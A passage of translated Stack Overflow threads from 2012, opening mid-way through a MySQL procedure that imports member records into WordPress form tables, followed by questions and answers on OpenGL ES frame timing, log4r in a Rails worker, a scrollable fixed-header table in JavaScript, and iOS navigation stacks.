  DECLARE vcrValue19 VARCHAR(200);  -- SUBMITED BY - FULL NAME
  DECLARE vcrValue20 VARCHAR(200);  -- SUBMITTED BY - MAIL
  DECLARE vcrValue23 VARCHAR(200);  -- YEAR AWARDED
  DECLARE vcrValue24_6 VARCHAR(200);  -- FIRST NAME
  DECLARE vcrValue24_3 VARCHAR(200);  -- LAST NAME
  DECLARE vcrValue25 VARCHAR(200);  -- TITLE

  SET intForm_id = 2;
  SET intLead_id_current = -1;
  SET vcrValue19 = 'Import from YM';  -- SUBMITED BY - FULL NAME
  SET vcrValue20 = '';  -- SUBMITTED BY - MAIL
  SET vcrValue12 = '';  -- STUDENT/ALUMNI
  SET vcrValue14 = '';  -- DESCRIPTION

  SELECT e.Web_Site_Member_ID, e.School, e.Home_Address_Line1, e.Home_City, e.Home_State_Abbrev, e.Home_Postal_Code,
     e.Home_Country, e.Class_of, e.Email_Address, e.Membership, e.Year_award_or_scholarship_received,
     e.First_Name, e.Last_Name, e.Title
  INTO intWeb_Site_Member_ID,
            vcrValue2,  -- SCHOOL
            vcrValue7,  -- ADDRESS LINE 1
            vcrValue8,  -- CITY
            vcrValue9,  -- STATE
            vcrValue10,  -- ZIP
            vcrValue11,  -- COUNTRY
            vcrValue13,  -- CLASS OF
            vcrValue16,  -- EMAIL
            vcrValue17,  -- AWARD
            vcrValue23,  -- YEAR AWARDED
            vcrValue24_6,   -- FIRST NAME
            vcrValue24_3,   -- LAST NAME
            vcrValue25   -- TITLE
    FROM Export_fromYM_2012_06_25 e
    WHERE e.Imported <> 'Y' AND e.Member_Type_Code = 'Student/Alumni'
    ORDER BY e.Web_Site_Member_ID ASC;

    INSERT INTO wp_hpvyvb_rg_lead
        (form_id, date_created, ip, source_url, user_agent)
    VALUES
        (1, NOW(), '', 'import');

    SET intLead_id_current = LAST_INSERT_ID();

    IF intLead_id_current > 0 THEN
    BEGIN
            INSERT INTO wp_hpvyvb_rg_lead_detail
              (lead_id, form_id, field_number, value)
            VALUES
              (intLead_id_current, intForm_id, 2, vcrValue2);

            INSERT INTO wp_hpvyvb_rg_lead_detail
              (lead_id, form_id, field_number, value)
            VALUES
              (intLead_id_current, intForm_id, 7, vcrValue7);

            INSERT INTO wp_hpvyvb_rg_lead_detail
              (lead_id, form_id, field_number, value)
            VALUES
              (intLead_id_current, intForm_id, 8, vcrValue8);

            INSERT INTO wp_hpvyvb_rg_lead_detail
              (lead_id, form_id, field_number, value)
            VALUES
              (intLead_id_current, intForm_id, 9, vcrValue9);

              INSERT INTO wp_hpvyvb_rg_lead_detail
              (lead_id, form_id, field_number, value)
            VALUES
              (intLead_id_current, intForm_id, 10, vcrValue10);

              INSERT INTO wp_hpvyvb_rg_lead_detail
              (lead_id, form_id, field_number, value)
            VALUES
              (intLead_id_current, intForm_id, 11, vcrValue11);

              INSERT INTO wp_hpvyvb_rg_lead_detail
              (lead_id, form_id, field_number, value)
            VALUES
              (intLead_id_current, intForm_id, 12, vcrValue12);

              INSERT INTO wp_hpvyvb_rg_lead_detail
              (lead_id, form_id, field_number, value)
            VALUES
              (intLead_id_current, intForm_id, 13, vcrValue13);

              INSERT INTO wp_hpvyvb_rg_lead_detail
              (lead_id, form_id, field_number, value)
            VALUES
              (intLead_id_current, intForm_id, 14, vcrValue14);

              INSERT INTO wp_hpvyvb_rg_lead_detail
              (lead_id, form_id, field_number, value)
            VALUES
              (intLead_id_current, intForm_id, 16, vcrValue16);

              INSERT INTO wp_hpvyvb_rg_lead_detail
              (lead_id, form_id, field_number, value)
            VALUES
              (intLead_id_current, intForm_id, 17, vcrValue17);

              INSERT INTO wp_hpvyvb_rg_lead_detail
              (lead_id, form_id, field_number, value)
            VALUES
              (intLead_id_current, intForm_id, 19, vcrValue19);

              INSERT INTO wp_hpvyvb_rg_lead_detail
              (lead_id, form_id, field_number, value)
            VALUES
              (intLead_id_current, intForm_id, 20, vcrValue20);

              INSERT INTO wp_hpvyvb_rg_lead_detail
              (lead_id, form_id, field_number, value)
            VALUES
              (intLead_id_current, intForm_id, 23, vcrValue23);

              INSERT INTO wp_hpvyvb_rg_lead_detail
              (lead_id, form_id, field_number, value)
            VALUES
              (intLead_id_current, intForm_id, 24.6, vcrValue24_6);

              INSERT INTO wp_hpvyvb_rg_lead_detail
              (lead_id, form_id, field_number, value)
            VALUES
              (intLead_id_current, intForm_id, 24.3, vcrValue24_3);

              INSERT INTO wp_hpvyvb_rg_lead_detail
              (lead_id, form_id, field_number, value)
            VALUES
              (intLead_id_current, intForm_id, 25, vcrValue25);

        UPDATE Export_fromYM_2012_06_25 SET Imported = 'Y', CustomFieldsMemberID = intLead_id_current WHERE @intWeb_Site_Member_ID = Web_Site_Member_ID;

     END; -- IF

END;
$$

DELIMITER ; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-05T23:39:13.933

我想到了。

我不需要 if 语句上的“开始”“结束”，而是“结束如果”

谢谢！

# java - OpenGL ES 2.0 测量性能 (FPS)（帧持续时间）

> ID：11820923
> 
> 赞同：1
> 
> 时间：2012-08-05T23:17:28.420
> 
> 标签：java, opengl-es, opengl-es-2.0

当我阅读在 OpenGL 中测量每秒帧数时，我遇到了这个问题：

[如何测量 OpenGL ES 的真实 FPS 性能？](https://stackoverflow.com/questions/6586635/how-to-measure-true-fps-performance-of-opengl-es)

我从中得到的是，您可以获得 FPS，但它并不是性能的真正指标，而 Frame Duration 将是一个更好的选择。他们还有其他方法来衡量 OpenGL 的渲染性能吗？如果是这样，为什么它们比上一个更好（或更差）？

我不确定我是否理解为什么 FPS 也不是一个很好的性能指标。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-06T01:45:22.900

与其说它不是“真正的性能指标”，不如说如果你不知道你在说什么，它很容易产生误导。

如果您真的想以某个 FPS 为目标，那么将其视为一个指标并没有错，但您只需要记住它不是性能的线性衡量标准。

例如，如果您的 FPS 从 30 变为 20，那么帧性能时间将显着减少（33 毫秒到 50 毫秒）

但是，如果您的 FPS 从 2000 变为 400，则实时差异很小（仅 2 毫秒差异）。

不鼓励使用 FPS，因为这样会让新开发人员惊慌失措地说*“我的 FPS 下降了 1600，我做错了什么？？”*

# ruby-on-rails - 如何登录没有环境的 Rails 应用程序的 Ruby 工作脚本？

> ID：11820928
> 
> 赞同：1
> 
> 时间：2012-08-05T23:18:26.867
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, logging, log4r

我正在使用 rufus-scheduler 来处理 Rails 3.2.x 应用程序的 cron 作业。root`worker.rb`正在由工头（实际上是这个特定服务器上的新贵）启动，因此当它启动时，它没有运行的 Rails 上下文。显然，当我尝试打电话`logger`或`Rails.logger`每次都会失败。

我正在使用`log4r`作为默认 Rails Logger 的替代品，这非常好，但我想知道这个问题的正确解决方案是什么：

1）我是否需要在启动时为脚本提供 Rails 上下文（它现在只是在运行`rake`任务，所以当工作脚本移交给 rake 任务时它最终会获得 Rails 环境，我担心之前给脚本提供 Rails 环境运行定时任务将是矫枉过正，因为启动 env 需要很长时间）？或者

2) 我是否应该`log4r`像在非 Rails Ruby 脚本中那样进行设置，该脚本只是读取 Rails 应用程序正在使用的相同 log4r.yml 配置，因此参与相同的日志结构？

3）或者我没有想到的其他选择？

此外，我将不胜感激一个示例或我应该在推荐的实施中考虑的步骤。

作为参考，我遵循了“[如何使用 Rails 3.0.x 配置 Log4r？](https://stackoverflow.com/questions/5664136/how-to-configure-log4r-with-rails-3-0-x) ”，我认为这在与上述内容集成时会有所帮助：“[在 Ruby 应用程序中正确使用 Log4r？”](https://stackoverflow.com/questions/2472865/properly-using-log4r-in-ruby-application)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T23:49:46.027

我想这可能是你正在寻找的..

在工作人员本身中使用它，并创建一个自定义命名的日志文件

```
require 'log4r'

logger = Log4r::Logger.new('test')
logger.outputters << Log4r::Outputter.stdout
logger.outputters << Log4r::FileOutputter.new('logtest', :filename =>  'logtest.log')
logger.info('started script')

## You're actual worker methods go here

logger.info('finishing') 
```

# javascript - 跨度在调整大小和/或缩放时跳来跳去

> ID：11820932
> 
> 赞同：0
> 
> 时间：2012-08-05T23:18:55.890
> 
> 标签：javascript, html, dhtml

我很茫然——我的 Javascript 很糟糕，我试图展示一些基于跨度的面板来保存一些表格。面板只是左侧面板和右侧面板（您在左侧选择一些东西 - 您会在右侧看到一些东西）。我需要使用跨度，因为我让 Ajax 定期重新填充它们。我还需要使用 ID 为 ResizableListTableDiv 的跨度，因为在使用 www.jaimon.co.uk 上的出色 fxHeader javascript 时这是必要的（我已嵌入代码以帮助提取样本）[注意 - 我的版本m using 现在似乎与 jaimon.co.uk 上的版本不完全匹配]

我的面板工作到一定程度，但我发现问题：-

1) 当页面缩放低于 80% 时，或

2）当我调整窗口大小时，或者

3）当我放大和缩小时。

（主要问题是右侧面板在这些事件中翻转到另一个面板下方）。

请注意，到目前为止，我只关注 IE - 关于如何制作任何浏览器的提示也会很好。

PS。我是否需要使用 Javascript 来执行此操作，或者我是否遗漏了某些内容而 html 应该为我执行此操作？

```
<html>
<head>
<SCRIPT LANGUAGE='JavaScript'>
/*
 *  @Author Jaimon Mathew www.jaimon.co.uk
 *  Please see http://jaimonmathew.wordpress.com/2010/03/19/making-scrollable-tables-with-fixed-headers-updated-2/
*/
(function() {
    var flag=false;
    var tbl=new Array();
    this.ge$=function(d) {return document.getElementById(d);};
    this.scrollHeader = function(evt) {
        if(flag) {
            return;
        }
        var e=evt?evt:window.event;
        var t=e.target?e.target:e.srcElement;
    if (t.nodeType == 3) {
            t = t.parentNode;
        }
        var tid=t.id.replace(':scroller','');
        var fh=ge$(tid+':scroller:fx');
        var sd=ge$(tid+':scroller');
        fh.style.left=(0-sd.scrollLeft)+'px';
        var cf=ge$(tid+'_CFB');
        if(cf) {
            var dmt=parseInt(cf.getAttribute('dmt'));
            cf.style.marginTop=(0-(sd.scrollTop+dmt))+'px';
        }
    };
    function gbw() {
        return document.body.offsetWidth?document.body.offsetWidth:window.innerWidth;
    }
    function addScrollerDivs(tid,noOfCols) {
        if(ge$(tid+':scroller')) {
            return;
        }
        var tb=ge$(tid);
        var tb2=tb.parentNode;
        var ns=tb.nextSibling;
        var sd=document.createElement("div");
        sd.id=tid+':scroller';
        sd.style.cssText = 'height:auto;overflow-x:auto;overflow-y:auto;width:auto;';
        sd.onscroll=scrollHeader;
        sd.appendChild(tb);
        var sd2=document.createElement("div");
        sd2.id=tid+':scroller:fx:OuterDiv';
        sd2.style.cssText='position:relative;width:auto;overflow:hidden;overflow-x:hidden;padding:0px;margin:0px;';

        sd2.innerHTML='<div id="' + tid + ':scroller:fx" style="text-align:left;position:relative;width:9999px;padding:0px;margin-left:0px;"><font size="3" color="red">Please wait while loading the table..</font></div>';
        var fc=null;
        if(noOfCols > 0) {
            fc=document.createElement("div");
            fc.id=tid+':scroller:fxcol';
            fc.style.cssText='width:0px;height:auto;display:block;float:left;overflow:hidden;';
            fc.innerHTML = "<div id='" + tid +":scroller:fxCH' style='width:100%;overflow:hidden;'>&nbsp;</div><div id='" + tid +":scroller:fxCB' style='width:100%;overflow:hidden;'>&nbsp;</div>";
        }
        if(ns) {
            if(fc) tb2.insertBefore(fc, ns);
            tb2.insertBefore(sd2, ns);
            tb2.insertBefore(sd, ns);
        }else {
            if(fc) tb2.appendChild(fc);
            tb2.appendChild(sd2);
            tb2.appendChild(sd);
        }
    }

    this.fxheader = function() {
        if(flag) {return;}
        flag=true;
        var perUsed=false;
        for(var i=0;i<tbl.length;i++) {
            var tbDiv=ge$(tbl[i].tid);

            var w=tbl[i].swidth+'';
            if(w.indexOf('%')>=0) {
                perUsed=true;
                var ttt=ge$(tbl[i].tid+':scroller:fx');
                ttt.style.width='0px';
                var twi=parseInt(w);
                w=(gbw()*twi/100);
                ttt.style.width='9999px';
            }
            //if ie6/7 then allow for 18px scrollbar area
            tbDiv.style.width=(parseInt(w-18))+'px';
            var fh=ge$(tbl[i].tid + ':scroller:fx');
            fh.style.marginLeft='0px';
            fh.style.display='';
            var cn=fh.childNodes;
            var j;
            for(j=0;j<cn.length;j++) {
                fh.removeChild(cn[j]);
            }
            var t=tbDiv.cloneNode(false);
            t.id=tbl[i].tid+'__cN';
            if(document.all) {
                t.style.width=tbDiv.offsetWidth+'px';
            }else {
                t.style.width='auto';
            }
            t.style.marginTop='0px';
            t.style.marginLeft='0px';
            var th=document.createElement("thead");
            th.style.padding='0px';
            th.style.margin='0px';
            for(j=0;j<tbl[i].noOfRows;j++) {
                var r=tbDiv.rows[j].cloneNode(true);
                th.appendChild(r);
            }
            t.appendChild(th);
            fh.appendChild(t);
            var t2;
            if(tbl[i].noOfCols > 0) {
                t2=t.cloneNode(true);
                t2.id=tbl[i].tid + '_CFH';
            }
            //adjusting widths
            var tHeight=0;
            for(j=0;j<tbl[i].noOfRows;j++) {
                //var c=ge$(tbl[i].tid+'__cN').rows[j].cells;
                var c=t.rows[j].cells;
                var c2;
                var oc=tbDiv.rows[j].cells;
                var q;
                if(t2) {
                    c2=t2.rows[j].cells;
                    for(q=0;q<c.length;q++) {
                        c[q].style.width=c2[q].style.width=(oc[q].offsetWidth-3) + 'px';
                    }
                }else {
                    for(q=0;q<c.length;q++) {
                        c[q].style.width=(oc[q].offsetWidth-7) + 'px';
                    }
                }
                tHeight+=tbDiv.rows[j].offsetHeight;
            }
            tbDiv.style.marginTop = "-" + tHeight + "px";
            var h=tbl[i].sheight;
            if(tbDiv.offsetHeight < h) {
                h=tbDiv.offsetHeight+18;
            }
            var cw=0;
            //Column freezing
            if(tbl[i].noOfCols > 0) {
                for(j=0;j<tbl[i].noOfCols;j++) {
                    cw+=tbDiv.rows[0].cells[j].offsetWidth;
                }

                tbDiv.style.marginLeft = "-" + cw + "px";
                tbDiv.style.display='block';
                fh.style.marginLeft = "-" + cw + "px";
                var fxcol=ge$(tbl[i].tid+':scroller:fxcol').style;
                fxcol.width=(cw)+'px';
                var fxCH=ge$(tbl[i].tid+':scroller:fxCH');
                var fxCB=ge$(tbl[i].tid+':scroller:fxCB');
                fxCH.innerHTML='';
                fxCB.innerHTML='';
                fxCH.appendChild(t2);
                fxCH.style.height=tHeight+'px';
                fxCB.style.height=(h-tHeight)+'px';
                var t3=tbDiv.cloneNode(true);
                t3.id=tbl[i].tid + '_CFB';
                t3.style.marginLeft = "0px";
                t3.setAttribute('dmt', tHeight);
                fxCB.appendChild(t3);
            }
            w=(parseInt(w)-cw)+'px';
            //alert(i+') '+tbl[i].tid+'...'+h+'-'+tHeight); .. problems occur when h-tHeight go negative
            ge$(tbl[i].tid+':scroller').style.height=(h-tHeight) + 'px';
            ge$(tbl[i].tid+':scroller').style.width=w;
            ge$(tbl[i].tid+':scroller:fx:OuterDiv').style.height=tHeight + 'px';
            ge$(tbl[i].tid+':scroller:fx:OuterDiv').style.width=w;
        }
        //if(perUsed) {
            window.onresize=fxheader;
        //}
        flag=false;
    };

    this.reInit = function() {
        for(t=0; t<tbl.length;t++) {
            var _tid0=tbl[t].tid;
            var _tid1=tbl[t].tid+":scroller";
            var _tid2=tbl[t].tid+":scroller:fx:OuterDiv";
            var sheight;
            var o=document.getElementById(_tid1);
            r=o.offsetTop; 
            while(o=o.offsetParent)r+=o.offsetTop;
            t2=r;

            var o2=document.getElementById(_tid1);
            r=o2.offsetLeft; 
            while(o2=o2.offsetParent)r+=o2.offsetLeft; 
            var l2=r+35;

            var htmlwidth = document.body.parentNode.scrollWidth;
            var htmlheight = document.body.parentNode.scrollHeight;

            var d=document;
            var windowwidth = window.innerWidth;
            var windowheight = window.innerHeight;
            if (typeof window.innerWidth!='undefined') {
                windowwidth = window.innerWidth;
                windowheight = window.innerHeight;
            } else {
                 if (d.documentElement &&
                 typeof d.documentElement.clientWidth!='undefined' &&
                 d.documentElement.clientWidth!=0) {
                     windowwidth = d.documentElement.clientWidth;
                     windowheight = d.documentElement.clientHeight;
                 } else {
                     if (d.body &&
                     typeof d.body.clientWidth!='undefined') {
                         windowwidth = d.body.clientWidth;
                         windowheight = d.body.clientHeight;
                     }
                 }
            }

            if ( htmlheight < windowheight ) {
                document.body.height = windowheight;
                if ( windowheight>t2) {
                    sheight=(windowheight-t2);
                }
                else {
                    sheight=10;
                }
            } 
            else { 
                document.body.height = htmlheight;
                if ( htmlheight>t2) {
                    sheight= (htmlheight-t2-50);
                }
                else {
                    sheight=10;
                }
            } 
            if ( sheight > 200 ) {
                tbl[t].sheight=sheight;
            }

            var o2=document.getElementById(_tid0);
            var o3=document.getElementById(_tid1);
            var o4=document.getElementById(_tid2);
            if ( htmlwidth < windowwidth ) { 
                document.body.width = windowwidth + "px";
                //o2.style.width = (windowwidth-l2) + "px";
                o3.style.width = (windowwidth-l2) + "px";
                if ( o4 != null ) {
                    o4.style.width = o3.style.width;
                }
                //ResizableListTableBodyDiv2.style.width = (windowwidth-l2) + "px";
            } 
            else { 

                document.body.width = htmlwidth + "px"; 
                //o2.style.width = (htmlwidth-l2) + "px";
                o3.style.width = (htmlwidth-l2-25) + "px";
                if ( o4 != null ) {
                    o4.style.width = o3.style.width;
                }
                //ResizableListTableBodyDiv2.style.width = (htmlwidth-l2) + "px";
            }
        }
    };
    this.fxheaderInit = function(_tid,_sheight,_noOfRows,_noOfCols) {
        var tb = new Object();
        var td=ge$(_tid);
        tb.tid=_tid;
        tb.sheight=_sheight;
        if ( _sheight == 0 ) {

            var o=document.getElementById(_tid),r=o.offsetTop; 
               while(o=o.offsetParent)r+=o.offsetTop; 
               t2=r+30;

            var htmlheight = document.body.parentNode.scrollHeight;
            var windowheight = window.innerHeight;  
            if ( htmlheight < windowheight ) { 
                document.body.height = windowheight;
                if ( windowheight>t2) {
                    tb.sheight=(windowheight-t2);
                }
                else {
                    tb.sheight=10;
                }
            } 
            else { 
                document.body.height = htmlheight;
                if ( htmlheight>t2) {
                    tb.sheight= (htmlheight-t2-50);
                }
                else {
                    tb.sheight= 10;
                }
            } 
        }
        tb.swidth=td.width;
        if(!tb.swidth || tb.swidth.length==0) {
            tb.swidth=td.style.width;
            if(!tb.swidth) tb.swidth = '100%';
            if(tb.swidth.indexOf('%')==-1) {
                tb.swidth = parseInt(tb.swidth);    
            }
        }
        tb.noOfRows=_noOfRows;
        tb.noOfCols=_noOfCols;
        addScrollerDivs(_tid,_noOfCols);
        tbl[tbl.length]=tb;
        //reInit();
    };
})();
</SCRIPT>

<SCRIPT LANGUAGE='JavaScript'>
//-----------------------------------------------------------------------------------------
var tableDone = false;
//-----------------------------------------------------------------------------------------
function resizeListTable0() {
    if ( navigator.appName == 'Microsoft Internet Explorer' ) {
        resizeListTable(false);
    }
}
//-----------------------------------------------------------------------------------------
function getPX(x){ x2=''+x; return x2.replace(/px/, ''); } 
//-----------------------------------------------------------------------------------------
function resizeListTable(forceNewTable) {

    if ( navigator.appName == 'Microsoft Internet Explorer' ) {
        var divObjId    = 'ResizableListTableDiv';
        var divObj2Id   = 'ResizableListTableBodyDiv';

        var ResizableListTableDiv       = document.getElementById(divObjId);
        var ResizableListTableBodyDiv   = document.getElementById(divObj2Id);

        if ( ResizableListTableBodyDiv != null ) {

            var divObjHeight    = ResizableListTableDiv.style.height;
            var tableWidth      = ResizableListTableBodyDiv.style.width; 
            var numCols         = ResizableListTable.firstChild.firstChild.childNodes.length;

            var t2=mytop(divObj2Id)+80;
            var l2=myleft(divObj2Id)+40;

            var htmlwidth = document.body.parentNode.scrollWidth;
            var htmlheight = document.body.parentNode.scrollHeight;
            var windowwidth = window.innerWidth;
            var windowheight = window.innerHeight;  

            if (forceNewTable ||  ! tableDone) {
                tableDone = true;
            }

            var d=document;
            var windowwidth = window.innerWidth;
            var windowheight = window.innerHeight;
            if (typeof window.innerWidth!='undefined') {
                windowwidth = window.innerWidth;
                windowheight = window.innerHeight;
            } else {
                 if (d.documentElement &&
                 typeof d.documentElement.clientWidth!='undefined' &&
                 d.documentElement.clientWidth!=0) {
                     windowwidth = d.documentElement.clientWidth;
                     windowheight = d.documentElement.clientHeight;
                 } else {
                     if (d.body &&
                     typeof d.body.clientWidth!='undefined') {
                         windowwidth = d.body.clientWidth;
                         windowheight = d.body.clientHeight;
                     }
                 }
            }

            if ( htmlheight < windowheight ) { 
                document.body.height = windowheight + "px";
                if ( windowheight>t2) {
                    ResizableListTableBodyDiv.style.height = (windowheight-t2) + "px";
                }
                else {
                    ResizableListTableBodyDiv.style.height = "10px";
                }
            } 
            else { 
                document.body.height = htmlheight + "px";
                if ( htmlheight>t2) {
                    ResizableListTableBodyDiv.style.height = (htmlheight-t2) + "px";
                }
                else {
                    ResizableListTableBodyDiv.style.height = "10px";
                }
            } 

            if ( htmlwidth < windowwidth ) { 
                document.body.width = windowwidth + "px";
                ResizableListTableDiv.style.width = (windowwidth-l2) + "px";
                ResizableListTableBodyDiv.style.width = (windowwidth-l2) + "px";
            } 
            else { 
                if ( htmlwidth < l2 ) {
                    l2=0;
                }
                document.body.width = htmlwidth + "px"; 
                ResizableListTableDiv.style.width = (htmlwidth-l2) + "px";
                ResizableListTableBodyDiv.style.width = (htmlwidth-l2) + "px";
            } 

            ResizableListTableBodyDiv.onscroll = function (e) {
                ResizableListTableDiv.scrollLeft = ResizableListTableBodyDiv.scrollLeft;
            };
            ResizableListTableBodyDiv.style.display = 'block';
            ResizableListTableBodyDiv.style.visibility = 'visible';

        }
    }
    return; 
}
//-----------------------------------------------------------------------------------------
function mytop(n){ 
   var o=document.getElementById(n),r=o.offsetTop; 
   while(o=o.offsetParent)r+=o.offsetTop; 
   return r; 
}
//-----------------------------------------------------------------------------------------
function myleft(n){ 
   var o=document.getElementById(n),r=o.offsetLeft; 
   while(o=o.offsetParent)r+=o.offsetLeft; 
   return r; 
} 
//-----------------------------------------------------------------------------------------
if ( navigator.appName == 'Microsoft Internet Explorer' ) {
    if (window.addEventListener) { //DOM method for binding an event
        window.addEventListener("load", resizeListTable0(), false);
        window.addEventListener("resize", resizeListTable0(), false);
    }
    else if (window.attachEvent) { //IE exclusive method for binding an event
        window.attachEvent("onload", resizeListTable0);
        window.attachEvent("onresize", resizeListTable0);
    }
    else if (document.getElementById) { //support older modern browsers
        window.onload=resizeListTable0();
        window.resize=resizeListTable0();
    }
}
</SCRIPT>
</head>
<body>
<span
    style='border: solid 1pt red; margin: 5px 5px 5px 0px; padding: 0px; height: 100%; width: 25%; position: relative; float: left; overflow: auto'>
<table border=0 style='width: 100%;'>
    <tr><td>Hello World</td></tr>
    <tr><td>Hello World</td></tr>
    <tr><td>Hello World</td></tr>
    <tr><td>Hello World</td></tr>
    <tr><td>Hello World</td></tr>
    <tr><td>Hello World</td></tr>
    <tr><td>Hello World</td></tr>
    <tr><td>Hello World</td></tr>
    <tr><td>Hello World</td></tr>
    <tr><td>Hello World</td></tr>
    <tr><td>Hello World</td></tr>
    <tr><td>Hello World</td></tr>
    <tr><td>Hello World</td></tr>
    <tr><td>Hello World</td></tr>
    <tr><td>Hello World</td></tr>
    <tr><td>Hello World</td></tr>
    <tr><td>Hello World</td></tr>
    </table>
</span>

<span style='width: 100%; border: blue solid 1pt '> 
<hr>
<span id='ResizableListTableDiv'
    style='border: solid 1pt green; padding: 0px; margin: 0px; width: 55%; overflow-x: hidden; overflow-y: hidden; height: 100%;'>
</span> 
<span id='ResizableListTableBodyDiv'
    style='border: solid 1pt orange; padding: 0px; margin: 0px; width: 95%; overflow-x: auto; overflow-y: auto; height: 90%;'>

<table width=1400 id='ResizableListTable' style='padding:0px; margin:0px; border: none;'>
    <tr><th width=100>Column 1</th><th width=400>Column 2</th><th width=200>Column 3</th><th width=400>Column 4</th><th width=300>Column 5</th></tr>
    <tr><td>Column 1</td><td>Column 2</td><td>Column 3</td><td>Column 4</td><td>Column 5</td></tr>
    <tr><td>Column 1</td><td>Column 2</td><td>Column 3</td><td>Column 4</td><td>Column 5</td></tr>
    <tr><td>Column 1</td><td>Column 2</td><td>Column 3</td><td>Column 4</td><td>Column 5</td></tr>
    <tr><td>Column 1</td><td>Column 2</td><td>Column 3</td><td>Column 4</td><td>Column 5</td></tr>
    <tr><td>Column 1</td><td>Column 2</td><td>Column 3</td><td>Column 4</td><td>Column 5</td></tr>
    <tr><td>Column 1</td><td>Column 2</td><td>Column 3</td><td>Column 4</td><td>Column 5</td></tr>
    <tr><td>Column 1</td><td>Column 2</td><td>Column 3</td><td>Column 4</td><td>Column 5</td></tr>
    <tr><td>Column 1</td><td>Column 2</td><td>Column 3</td><td>Column 4</td><td>Column 5</td></tr>
    <tr><td>Column 1</td><td>Column 2</td><td>Column 3</td><td>Column 4</td><td>Column 5</td></tr>
    <tr><td>Column 1</td><td>Column 2</td><td>Column 3</td><td>Column 4</td><td>Column 5</td></tr>
    <tr><td>Column 1</td><td>Column 2</td><td>Column 3</td><td>Column 4</td><td>Column 5</td></tr>
    <tr><td>Column 1</td><td>Column 2</td><td>Column 3</td><td>Column 4</td><td>Column 5</td></tr>
    <tr><td>Column 1</td><td>Column 2</td><td>Column 3</td><td>Column 4</td><td>Column 5</td></tr>
    <tr><td>Column 1</td><td>Column 2</td><td>Column 3</td><td>Column 4</td><td>Column 5</td></tr>
    <tr><td>Column 1</td><td>Column 2</td><td>Column 3</td><td>Column 4</td><td>Column 5</td></tr>
    <tr><td>Column 1</td><td>Column 2</td><td>Column 3</td><td>Column 4</td><td>Column 5</td></tr>
    <tr><td>Column 1</td><td>Column 2</td><td>Column 3</td><td>Column 4</td><td>Column 5</td></tr>
    <tr><td>Column 1</td><td>Column 2</td><td>Column 3</td><td>Column 4</td><td>Column 5</td></tr>
    <tr><td>Column 1</td><td>Column 2</td><td>Column 3</td><td>Column 4</td><td>Column 5</td></tr>
    <tr><td>Column 1</td><td>Column 2</td><td>Column 3</td><td>Column 4</td><td>Column 5</td></tr>
    <tr><td>Column 1</td><td>Column 2</td><td>Column 3</td><td>Column 4</td><td>Column 5</td></tr>
    <tr><td>Column 1</td><td>Column 2</td><td>Column 3</td><td>Column 4</td><td>Column 5</td></tr>
    <tr><td>Column 1</td><td>Column 2</td><td>Column 3</td><td>Column 4</td><td>Column 5</td></tr>
    <tr><td>Column 1</td><td>Column 2</td><td>Column 3</td><td>Column 4</td><td>Column 5</td></tr>
    <tr><td>Column 1</td><td>Column 2</td><td>Column 3</td><td>Column 4</td><td>Column 5</td></tr>
    <tr><td>Column 1</td><td>Column 2</td><td>Column 3</td><td>Column 4</td><td>Column 5</td></tr>
    <tr><td>Column 1</td><td>Column 2</td><td>Column 3</td><td>Column 4</td><td>Column 5</td></tr>
    <tr><td>Column 1</td><td>Column 2</td><td>Column 3</td><td>Column 4</td><td>Column 5</td></tr>
</table>
</span>
</span>
</body> 
```

# ios - 如何弹回根视图控制器，然后推送到不同的视图？

> ID：11820934
> 
> 赞同：18
> 
> 时间：2012-08-05T23:18:57.960
> 
> 标签：ios, xcode, cocoa, uiviewcontroller, uinavigationcontroller

我正在编写一个具有 3 个视图控制器的简单应用程序。根视图控制器是一个`item listing`基本的表视图。在这个视图控制器之外，我基于一些用户交互推送了两个不同的视图控制器——一个`create item`视图控制器或一个`view item`视图控制器。

所以，故事板的转场看起来就像一个 V 或其他东西。

在我的`create item`视图控制器上，我希望它在用户创建新项目时弹回根视图控制器，然后推送到`view item`控制器以便我可以查看新创建的项目。

我似乎无法让它工作。弹回根视图控制器很容易，但我无法推送该`view item`控制器。

有任何想法吗？我在下面粘贴了我的代码。pop 功能有效，但新视图永远不会出现。

```
- (void) onSave:(id)sender {

    CLLocation *currentLocation = [[LocationHelper sharedInstance] currentLocation];

    // format the thread object dictionary
    NSArray* location = @[ @(currentLocation.coordinate.latitude), @(currentLocation.coordinate.longitude) ];
    NSDictionary* thread = @{ @"title": _titleField.text, @"text": _textField.text, @"author": @"mustached-bear", @"location": location };

    // send the new thread to the api server
    [[DerpHipsterAPIClient sharedClient] postPath:@"/api/thread"
                                       parameters:thread
                                          success:^(AFHTTPRequestOperation *operation, id responseObject) {

                                              // init thread object
                                              Thread *thread = [[Thread alloc] initWithDictionary:responseObject];

                                              // init view thread controller
                                              ThreadViewController *viewThreadController = [[ThreadViewController alloc] init];
                                              viewThreadController.thread = thread;

                                              [self.navigationController popToRootViewControllerAnimated:NO];
                                              [self.navigationController pushViewController:viewThreadController animated:YES];

                                          }
                                          failure:^(AFHTTPRequestOperation *operation, NSError *error) {

                                              [self.navigationController popToRootViewControllerAnimated:YES];

                                          }];

} 
```

* * *

## 回答 #1

> 赞同：44
> 
> 时间：2012-08-06T00:17:44.827

如果我理解正确，你有一堆视图控制器：

```
A (root) - B - C - D - E 
```

你希望它变成：

```
A (root) - F 
```

对？在这种情况下：

```
NSArray *viewControllers = self.navigationController.viewControllers;
NSMutableArray *newViewControllers = [NSMutableArray array];

// preserve the root view controller
[newViewControllers addObject:[viewControllers objectAtIndex:0]];
// add the new view controller
[newViewControllers addObject:viewThreadController];
// animatedly change the navigation stack
[self.navigationController setViewControllers:newViewControllers animated:YES]; 
```

**斯威夫特 4**

```
// get current view controllers in stack and replace them
let viewControllers = self.navigationController!.viewControllers
let newViewControllers = NSMutableArray()

// preserve the root view controller
newViewControllers.add(viewControllers[0])
// add the new view controller
newViewControllers.add(viewThreadController)
// animatedly change the navigation stack
self.navigationController?.setViewControllers(newViewControllers as! [UIViewController], animated: true) 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-08-06T00:05:48.347

我认为
`[self.navigationController pushViewController:viewThreadController animated:YES];` 使用的 NavigationController 与之前的语句不同。因为在弹出到根视图控制器后，您会松开您所在的导航控制器。使用此代码解决此问题

```
UINavigationController *nav = self.navigationController; 
[self.navigationController popToRootViewControllerAnimated:NO];
[nav pushViewController:viewThreadController animated:YES]; 
```

